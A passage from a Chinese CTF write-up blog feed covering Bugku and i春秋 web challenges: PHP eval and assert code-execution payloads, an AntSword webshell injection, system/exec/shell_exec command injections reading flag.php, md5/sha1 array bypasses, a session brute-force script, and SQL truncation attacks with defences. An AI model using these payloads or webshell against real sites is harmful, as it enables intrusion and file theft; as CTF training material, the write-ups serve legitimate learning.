strlen($mkey);}        $dd = $value;        $od = ord($mkey[$i]);        array_push($md_data_source,$dd);        $data1 .= chr(($dd+128)-$od);  // 第一种可能, 余数+128-key 为回归数        $data2 .= chr($dd-$od);  // 第二种可能, 余数直接-key 为回归数    }    print "data1 =&gt; ".$data1."&lt;br&gt;\n";    print "data2 =&gt; ".$data2."&lt;br&gt;\n";}$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";decrypt($str);?&gt;</code></pre><p><img src="/2021/04/09/bugku-web33-jie-ma/blog/source_posts\Bugku：Web33-解码\在线解码.png" alt="在线解码"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:MiscWeb-爆破</title>
      <link href="2021/04/07/i-chun-qiu-miscweb-bao-po/"/>
      <url>2021/04/07/i-chun-qiu-miscweb-bao-po/</url>
      
        <content type="html"><![CDATA[<h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h2><h4 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h4><p>flag在6位变量中</p><pre><code>&lt;?phpinclude "flag.php";$a = @$_REQUEST['hello'];//以get或post传入hello，并赋值给`$a`if(!preg_match('/^\w*$/',$a )){//正则表达式^匹配一行的开头，$表示结束。\w表示匹配包括下划线的任何单词字符，等价于'[A-Za-z0-9_]'。*号：匹配前面的子表达式零次或多次。  die('ERROR');}eval("var_dump($$a);");show_source(__FILE__);//__FILE__当前运行文件的完整路径和文件名。?&gt;</code></pre><p>1、如果匹配正则表达式/^\w*$/，就打印变量 $$a<br>2、$a是hello，$$a是六位变量$hello<br>接下来不会了，所以百度一下<br>发现超全局变量$GLOBALS<br>作用：<br>引用全局作用域中可用的全部变量。这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。<br>3、所以在URL后加?hello=GLOBALS，将参数hello修改为Globals实际执行语句：</p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$a);"</span><span class="token punctuation">)</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($hello);"</span><span class="token punctuation">)</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($GLOBALS);"</span><span class="token punctuation">)</span></code></pre><p>得到flag</p><h2 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h2><h4 id="题目内容-1"><a href="#题目内容-1" class="headerlink" title="题目内容"></a>题目内容</h4><p>flag不在变量中</p><h4 id="法一：蚁剑连接"><a href="#法一：蚁剑连接" class="headerlink" title="法一：蚁剑连接"></a>法一：蚁剑连接</h4><pre><code>?hello=${@eval($_POST[1])</code></pre><p>访问flag.php</p><h4 id="法二：利用文件系统函数"><a href="#法二：利用文件系统函数" class="headerlink" title="法二：利用文件系统函数"></a>法二：利用文件系统函数</h4><h5 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h5><p><a href="http://php.net/manual/en/function.file.php"><code>file()</code></a> 函数用于将整个文件读入数组中。</p><p>尝试构造 payload </p><pre><code>?hello=file("flag.php")</code></pre><p>提交后直接看到 flag，证明推测正确</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=file(flag.php).png" alt="hello=file(flag.php)"></p><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><a href="http://php.net/manual/en/function.file-get-contents.php"><code>file_get_contents()</code></a> 函数用于将整个文件读入到一个字符串中。</p><p>尝试构造 payload</p><pre><code>?hello=file_get_contents("flag.php")</code></pre><p>提交后竟未显示 flag？这是因为 flag.php 文件中的内容以界定符 <code>&lt;?php</code> 开头，所以输出到浏览器时，该字符串被当做 PHP 脚本不予显示。但不必担心，右击页面空白处，查看网页源代码，即可看到 flag：</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=file_get_contents(flag.php).png" alt="hello=file_get_contents(flag.php)"></p><h5 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h5><p><a href="http://php.net/manual/en/function.show-source.php"><code>show_source()</code></a> 函数等同于 <a href="http://php.net/manual/en/function.highlight-file.php"><code>highlight_file()</code></a> 函数，可将一个 PHP 脚本文件语法高亮。</p><p>尝试构造 payload </p><pre><code>?hello=show_source("flag.php")</code></pre><p>提交后能看到语法高亮后的 flag：</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=show_source(flag.php).png" alt="hello=show_source(flag.php)"></p><h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p><a href="http://php.net/manual/en/function.readfile.php"><code>readfile()</code></a> 函数用于读取一个文件并写入到输出缓冲区。</p><p>在提交 payload </p><pre><code>?hello=readfile("flag.php")</code></pre><p> 在网页源代码处可看到 flag</p><h5 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h5><p><a href="http://php.net/manual/en/function.fread.php"><code>fread()</code></a> 函数用于读取二进制文件，不过首先得用 <a href="http://php.net/manual/en/function.fopen.php"><code>fopen()</code></a> 函数创建文件句柄，填入第一个参数，并在第二个参数中填入可读取的最大字节数。</p><p>因此，构造 payload </p><pre><code>?hello=fread(fopen("flag.php","r"),100)</code></pre><p>在网页源代码处可看到 flag</p><h4 id="法三：利用命令执行函数"><a href="#法三：利用命令执行函数" class="headerlink" title="法三：利用命令执行函数"></a>法三：利用命令执行函数</h4><p>利用 PHP 中的<a href="http://php.net/manual/en/ref.exec.php">命令执行函数</a>，通过执行系统命令以显示文件内容。</p><p>首先，由预定义常量 <a href="http://php.net/manual/en/reserved.constants.php"><code>PHP_OS</code></a> 可知后台操作系统的类型，构造 </p><pre><code>?hello=PHP_OS</code></pre><p> 提交后，发现是 Linux 操作系统：</p><p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=PHP_OS.png" alt="hello=PHP_OS"></p><h5 id="执行运算符"><a href="#执行运算符" class="headerlink" title="执行运算符"></a>执行运算符</h5><p>PHP 的<a href="http://php.net/manual/en/language.operators.execution.php">执行运算符</a>为反引号「`」，可将反引号之间的内容作为 shell 命令执行，并返回所有执行结果。</p><p>在构造 payload 之前，需要做两件事：</p><ul><li>闭合前面的 <code>var_dump(</code> 字符串。</li><li>注释后面的 <code>);</code> 字符串。</li></ul><p>因此，构造 payload </p><pre><code>hello=);echo `cat flag.php`;//</code></pre><p>在网页源代码处即可看到 flag</p><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p><a href="http://php.net/manual/en/function.system.php"><code>system()</code></a> 函数用于执行外部程序，输出执行结果，并返回结果的最后一行。</p><p>因此，在提交 payload </p><pre><code>hello=);echo system("cat flag.php");//</code></pre><p>在网页源代码处可看到两个 flag，是因为第一个 flag 是由输出结果而得，第二个 flag 是由返回值而得</p><h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p><a href="http://php.net/manual/en/function.exec.php"><code>exec()</code></a> 函数用于执行一个外部程序，并返回结果的最后一行。</p><p>因此，在提交 payload </p><pre><code>hello=);echo exec("cat flag.php");//</code></pre><p>可见 flag，因此 flag 正好是 flag.php 文件中的最后一行：</p><h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p><a href="http://php.net/manual/en/function.shell-exec.php"><code>shell_exec()</code></a> 函数可通过 shell 环境执行命令，并返回所有执行结果，本函数功能与执行运算符相同。</p><p>因此，构造 payload </p><pre><code>hello=);echo shell_exec("cat flag.php");//</code></pre><p>在网页源代码处即可看到 flag</p><h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p><a href="http://php.net/manual/en/function.passthru.php"><code>passthru()</code></a> 函数用于执行外部函数，并输出原始执行结果，没有返回值。</p><p>因此，构造 payload </p><pre><code>hello=);echo passthru("cat flag.php");//</code></pre><p>在网页源代码处即可看到 flag</p><h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p><a href="http://php.net/manual/en/function.popen.php"><code>popen()</code></a> 函数用于创建指向命令执行进程的文件句柄，与 <code>fopen()</code> 函数类似，最后将通过 <code>fread()</code> 函数读取命令执行的结果。</p><p>因此，构造 payload </p><p>hello=);echo fread(popen(“cat flag.php”,”r”),100);//</p><p>在网页源代码处即可看到 flag：</p><h2 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h2><pre><code>&lt;?php error_reporting(0);session_start();require('./flag.php');if(!isset($_SESSION['nums'])){  $_SESSION['nums'] = 0;  $_SESSION['time'] = time();  $_SESSION['whoami'] = 'ea';}if($_SESSION['time']+120&lt;time()){  session_destroy();}$value = $_REQUEST['value'];$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0){  $_SESSION['nums']++;  $_SESSION['whoami'] = $str_rands;  echo $str_rands;}if($_SESSION['nums']&gt;=10){  echo $flag;}show_source(__FILE__);?&gt;</code></pre><h4 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h4><p>这个真的是爆破。</p><h4 id="审计代码："><a href="#审计代码：" class="headerlink" title="审计代码："></a>审计代码：</h4><p>1、Session中的num初始值为0，time为当前时间，whoami初始值为ea。<br>2、120秒之后会话结束。然后str_rands随机生成2个字母。<br>3、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++。<br>4、whoami=str_rands，循环10次后，输出flag。</p><p>所以只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag。</p><pre><code>import requestsurl = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=ea"al = ['abcdefghijklmnopqrstuvwxyz']s = requests.session()r=s.get(url)for i in range(20):    url = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=" + r.content[0:2]    r=s.get(url)    print r.content</code></pre><p>或者：</p><p>?value[0]=e&amp;value[1]=a</p><p>会返回两个字符 假设是bq   那就  ?value[0]=b&amp;value[1]=q  代码主要是要验证这两个字符MD5的第五还是第六位是不是字符（弱类型可以过”==”号）或 0，写脚本的话注意session开启和重置</p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web29-各种绕过sha1</title>
      <link href="2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/"/>
      <url>2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/</url>
      
        <content type="html"><![CDATA[<h2 id="sha1与MD5区别："><a href="#sha1与MD5区别：" class="headerlink" title="sha1与MD5区别："></a>sha1与MD5区别：</h2><p>安全哈希算法（Secure Hash Algorithm）主要适用于数字签名标准（Digital Signature Standard  DSS）里面定义的数字签名算法（Digital Signature Algorithm  DSA）。对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要。该算法经过加密专家多年来的发展和改进已日益完善，并被广泛使用。该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。散列函数值可以说是对明文的一种“指纹”或是“摘要”所以对散列值的数字签名就可以视为对此明文的数字签名。单向散列函数的安全性在于其产生散列值的操作过程具有较强的单向性。如果在输入序列中嵌入密码，那么任何人在不知道密码的情况下都不能产生正确的散列值，从而保证了其安全性。SHA将输入流按照每块512位（64个字节）进行分块，并产生20个字节的被称为信息认证代码或信息摘要的输出。<br> 该算法输入报文的长度不限，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。<br>  通过散列算法可实现数字签名实现，数字签名的原理是将要传送的明文通过一种函数运算（Hash）转换成报文摘要（不同的明文对应不同的报文摘要），报文摘要加密后与明文一起传送给接受方，接受方将接受的明文产生新的报文摘要与发送方的发来报文摘要解密比较，比较结果一致表示明文未被改动，如果不一致表示明文已被篡改。<br> MAC （信息认证代码）就是一个散列结果，其中部分输入信息是密码，只有知道这个密码的参与者才能再次计算和验证MAC码的合法性。</p><p>SHA-1与MD5的比较<br> 因为二者均由MD4导出，SHA-1和MD5彼此很相似。相应的，他们的强度和其他特性也是相似，但还有以下几点不同：<br> l 对强行攻击的安全性：最显著和最重要的区别是SHA-1摘要比MD5摘要长32 位。使用强行技术，产生任何一个报文使其摘要等于给定报摘要的难度对MD5是2128数量级的操作，而对SHA-1则是2160数量级的操作。这样，SHA-1对强行攻击有更大的强度。<br> l 对密码分析的安全性：由于MD5的设计，易受密码分析的攻击，SHA-1显得不易受这样的攻击。<br> l 速度：在相同的硬件上，SHA-1的运行速度比MD5慢。</p><h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><p><img src="/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/blog/source_posts\Bugku：Web29-各种绕过sha1\源代码.png" alt="源代码"></p><p>只要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等</p><p>采用hackbar：</p><pre><code>?uname[]=1&amp;id=marginpost传值：passwd[]=2</code></pre><p><img src="/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/blog/source_posts\Bugku：Web29-各种绕过sha1\hackbar.png" alt="hackbar"></p><pre><code>flag{54f06835d645ab639ceb99e48a1a86da}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP:支持的协议和封装协议</title>
      <link href="2021/04/05/php-zhi-chi-de-xie-yi-he-feng-zhuang-xie-yi/"/>
      <url>2021/04/05/php-zhi-chi-de-xie-yi-he-feng-zhuang-xie-yi/</url>
      
        <content type="html"><![CDATA[<p>   PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>、   <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> 和   <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> 的文件系统函数。   除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> 来注册自定义的封装协议。  </p><blockquote><h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a><strong>注意</strong>:</h4><pre><code>用于描述一个封装协议的 URL 语法仅支持 `scheme://...` 的语法。    `scheme:/`    和 `scheme:` 语法是不支持的。</code></pre></blockquote><ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li></ul><p>参考：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web25-SQL约束攻击</title>
      <link href="2021/04/04/bugku-web25-sql-yue-shu-gong-ji/"/>
      <url>2021/04/04/bugku-web25-sql-yue-shu-gong-ji/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugku：web25-SQL约束攻击\admin.png" alt="admin"></p><p>用admin                                                  1</p><p>任意密码绕过注释‘</p><p>登录界面admin和前面注册用的密码得到flag</p><p>原因空格截断即长度限制</p><p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugku：web25-SQL约束攻击\flag.png" alt="flag"></p><p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugku：web25-SQL约束攻击\flag.png" alt="flag"></p><h2 id="防护"><a href="#防护" class="headerlink" title="防护:"></a>防护:</h2><p>毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：</p><ol><li>将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</li><li>最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪</li><li>为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL:约束攻击</title>
      <link href="2021/04/04/sql-yue-shu-gong-ji/"/>
      <url>2021/04/04/sql-yue-shu-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote><p>值得庆幸的是如今开发者在构建网站时，已经开始注重安全问题了。绝大部分开发者都意识到SQL注入漏洞的存在，在本文我想与读者共同去探讨另一种与SQL数据库相关的漏洞，其危害与SQL注入不相上下，但却不太常见。接下来，我将为读者详细展示这种攻击手法，以及相应的防御策略。</p></blockquote><p>注意：本文不是讲述SQL注入攻击</p><h4 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h4><p>最近，我遇到了一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问。当新用户尝试注册时，将运行以下代码：</p><pre><code>&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT *          FROM users          WHERE username='$username'";$res = mysql_query($query, $database);if($res) {  if(mysql_num_rows($res) &gt; 0) {    // User exists, exit gracefully    .    .  }  else {    // If not, only then insert a new entry    $query = "INSERT INTO users(username, password)              VALUES ('$username','$password')";    .    .  }}</code></pre><p>使用以下代码验证登录信息：</p><pre><code>&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT username FROM users          WHERE username='$username'              AND password='$password' ";$res = mysql_query($query, $database);if($res) {  if(mysql_num_rows($res) &gt; 0){      $row = mysql_fetch_assoc($res);      return $row['username'];  }}return Null;</code></pre><p>安全考虑:</p><blockquote><ul><li>过滤用户输入参数了吗？ – 完成检查</li><li>使用单引号（’）来增加安全性了吗？ – 完成检查</li></ul></blockquote><p>按理说应该不会出错了啊？</p><p>然而，攻击者依然能够以任意用户身份进行登录！</p><h4 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h4><p>在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。</p><ol><li><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire  ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</p><pre><code>SELECT * FROM users WHERE username='vampire     ';</code></pre><p>但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p></li><li><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。</p></li></ol><p>现在，让我们建立一个测试数据库来演示具体攻击过程。</p><pre><code>vampire@linux:~$ mysql -u root -pmysql&gt; CREATE DATABASE testing;Query OK, 1 row affected (0.03 sec)mysql&gt; USE testing;Database changed</code></pre><p>接着创建一个数据表users，其包含username和password列，并且字段的最大长度限制为25个字符。然后，我将向username字段插入“vampire”，向password字段插入“my_password”。</p><pre><code>mysql&gt; CREATE TABLE users (    -&gt;   username varchar(25),    -&gt;   password varchar(25)    -&gt; );Query OK, 0 rows affected (0.09 sec)mysql&gt; INSERT INTO users    -&gt; VALUES('vampire', 'my_password');Query OK, 1 row affected (0.11 sec)mysql&gt; SELECT * FROM users;+----------+-------------+| username | password    |+----------+-------------+| vampire  | my_password |+----------+-------------+1 row in set (0.00 sec)</code></pre><p>为了展示尾部空白字符的修剪情况，我们可以键入下列命令：</p><pre><code>mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire       ';+----------+-------------+| username | password    |+----------+-------------+| vampire  | my_password |+----------+-------------+1 row in set (0.00 sec)</code></pre><p>现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为“vampire”），只需要使用用户名“vampire[许多空白符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。</p><pre><code>mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire                   1';Empty set (0.00 sec)</code></pre><p>需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前25个字符。</p><pre><code>mysql&gt;   INSERT INTO users(username, password)    -&gt; VALUES ('vampire                   1', 'random_pass');Query OK, 1 row affected, 1 warning (0.05 sec)mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire';+---------------------------+-------------+| username                  | password    |+---------------------------+-------------+| vampire                   | my_password || vampire                   | random_pass |+---------------------------+-------------+2 rows in set (0.00 sec)</code></pre><p>很好，现在我们检索“vampire”的，将返回两个独立用户。注意，第二个用户名实际上是“vampire”加上尾部的18个空格。现在，如果使用用户名“vampire”和密码“random_pass”登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。</p><h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><p>毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：</p><ol><li>将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</li><li>最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪</li><li>为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</li></ol><p><a href="https://www.freebuf.com/articles/web/124537.html">https://www.freebuf.com/articles/web/124537.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web24-PHP是世界上最好的语言</title>
      <link href="2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/"/>
      <url>2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugku：Web24-PHP是世界上最好的语言\访问.png" alt="访问"></p><p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugku：Web24-PHP是世界上最好的语言\f12.png" alt="f12"></p><p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugku：Web24-PHP是世界上最好的语言\code.png" alt="code"></p><pre><code>?v1[]=QNKCDZO&amp;v2[]=s878926199a&amp;v3[]=</code></pre><pre><code>?v1[]=aaa&amp;v2[]=aa&amp;v3[]=</code></pre><pre><code>?v1[]=1&amp;v2[]=2&amp;v3[]=</code></pre><pre><code>flag{5f9c370a78e9b4b4436825cb986784e4}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web22-过狗一句话</title>
      <link href="2021/04/03/bugku-web22-guo-gou-yi-ju-hua/"/>
      <url>2021/04/03/bugku-web22-guo-gou-yi-ju-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="PHP-scandir-函数"><a href="#PHP-scandir-函数" class="headerlink" title="PHP scandir() 函数"></a>PHP scandir() 函数</h3><p>实例：</p><pre><code>&lt;?php$dir = "/images/";// Sort in ascending order - this is default$a = scandir($dir);// Sort in descending order$b = scandir($dir,1);print_r($a);print_r($b);?&gt;</code></pre><p>结果：</p><pre><code>Array([0] =&gt; .[1] =&gt; ..[2] =&gt; cat.gif[3] =&gt; dog.gif[4] =&gt; horse.gif[5] =&gt; myimages)Array([0] =&gt; myimages[1] =&gt; horse.gif[2] =&gt; dog.gif[3] =&gt; cat.gif[4] =&gt; ..[5] =&gt; .) </code></pre><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>scandir(*directory,sorting_order,context*);</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>directory</em></td><td>必需。规定要扫描的目录。</td></tr><tr><td><em>sorting_order</em></td><td>可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td></tr><tr><td><em>context</em></td><td>可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项。</td></tr></tbody></table><h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>提示：</p><pre><code>&lt;?php $poc = "a#s#s#e#r#t";$poc_1 = explode("#", $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];$poc_2($_GET['s'])?&gt;</code></pre><p> exlpde()分割a#s#s#e#r#t为assert，使用assert()函数的解析传进来的s串，assert有代码执行漏洞。</p><pre><code>?s=print_r(scandir('./'))</code></pre><p><img src="/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/blog/source_posts\Bugku：Web22-过狗一句话\s.png" alt="s"></p><p>访问</p><p><img src="/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/blog/source_posts\Bugku：Web22-过狗一句话\flaga15808abee46a1d5.txt.png" alt="flaga15808abee46a1d5.txt"></p><p>或者：</p><pre><code>?s=print_r(glob("*.*"))</code></pre><pre><code>?s=print_r(glob('*.txt'))</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web20-cookie欺骗</title>
      <link href="2021/04/03/bugku-web20-cookie-qi-pian/"/>
      <url>2021/04/03/bugku-web20-cookie-qi-pian/</url>
      
        <content type="html"><![CDATA[<pre><code>index.php?line=&amp;filename=a2V5cy50eHQ=</code></pre><p>修改line的值</p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=2.png" alt="line=2"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=3.png" alt="line=3"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=4.png" alt="line=4"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=5.png" alt="line=5"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=6.png" alt="line=6"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=7.png" alt="line=7"></p><p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=8.png" alt="line=8"></p><p><img 